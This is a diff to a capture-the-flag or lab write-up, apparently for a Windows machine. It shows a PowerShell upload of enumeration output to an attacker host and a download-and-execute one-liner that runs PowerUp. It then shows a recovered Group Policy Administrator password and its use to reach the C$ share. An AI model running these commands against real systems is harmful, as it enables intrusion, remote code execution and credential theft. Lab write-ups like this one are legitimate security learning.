@@ -174,3 +174,27 @@ And the result can be uploaded using:
 ```
 powershell Invoke-WebRequest -Uri http://10.10.14.55:8000 -Method Post -Infile C:\tmp\JAWS-Enum.txt 
 ```
+
+JAWS provided not much so we'll run another script called `PowerUp`.
+
+```
+$ powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.55:8000/PowerUp.ps1'); Invoke-AllChecks"
+```
+
+When Running PowerUp! we get some cached credentials:
+
+```
+Changed   : {2019-01-28 23:12:48}
+UserNames : {Administrator}
+NewName   : [BLANK]
+Passwords : {MyUnclesAreMarioAndLuigi!!1!}
+File      : C:\ProgramData\Microsoft\GroupPolicy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
+```
+
+Credentials:
+```
+Administrator
+MyUnclesAreMarioAndLuigi!!1!
+```
+
+These can be used to log into the SMB share as the Administrator and attach onto the `C$`. This lets us grab the `root.txt`!
